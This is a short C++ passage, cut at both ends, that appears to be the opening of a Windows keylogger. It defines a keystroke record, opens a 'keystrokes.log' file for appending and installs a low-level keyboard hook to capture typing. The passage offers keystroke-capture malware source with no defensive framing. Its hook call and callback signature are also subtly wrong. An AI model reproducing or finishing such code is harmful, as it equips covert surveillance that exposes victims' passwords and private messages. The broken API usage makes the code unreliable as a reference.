    bool bCtrlKey;
    bool bShiftKey;
    uint32_t dwMs;
} KEYSTROKE;

void CALLBACK KeyStrokeCallback(int h, int nCode, UINT dw, void* hwnd);
void SaveKeystroke(KEYSTROKE* keystroke);

int main() {
    FILE* logFile = nullptr;
    fopen_s(&logFile, "keystrokes.log", "a");
    if (!logFile) {
        cout << "Failed to create log file." << endl;
        return 1;
    }

    HHOOK hKeyboardHook = nullptr;
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyStrokeCallback);

